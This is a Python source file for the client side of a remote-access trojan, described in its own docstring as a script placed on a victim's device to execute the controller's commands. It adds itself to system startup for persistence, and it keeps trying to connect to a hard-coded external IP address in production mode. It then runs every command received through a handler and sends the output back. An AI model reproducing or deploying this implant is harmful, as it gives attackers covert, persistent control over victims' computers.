"""

client - script located at victim`s device and executes host`s commands

"""

from threading import Thread
from utils.utils import add_to_startup
from utils.client_handler import command_handler
from sys import argv
import socket
from os.path import join

add_to_startup(join('..', 'output', 'main'))
sock = socket.socket()

if len(argv) == 1:
    HOST, PORT = 'localhost', 9090
if argv[1] == '--prod':
    HOST, PORT = '185.127.224.67', 9002

while 'TRYING TO RECONNECT':
    try:
        sock.connect((HOST, PORT))
        break
    except:
        continue


def receive_data(conn):
    while True:
        try:
            data = conn.recv(1024)
            content = data.decode('utf-8')

            answer = command_handler(content)

            if answer:
                conn.send(str(answer).encode('utf-8'))
        except:
            continue



receiver = Thread(target=receive_data, args=[
                  sock], name='Socket-Data-Receiver 1', daemon=True)

receiver.start()

while 1:
    pass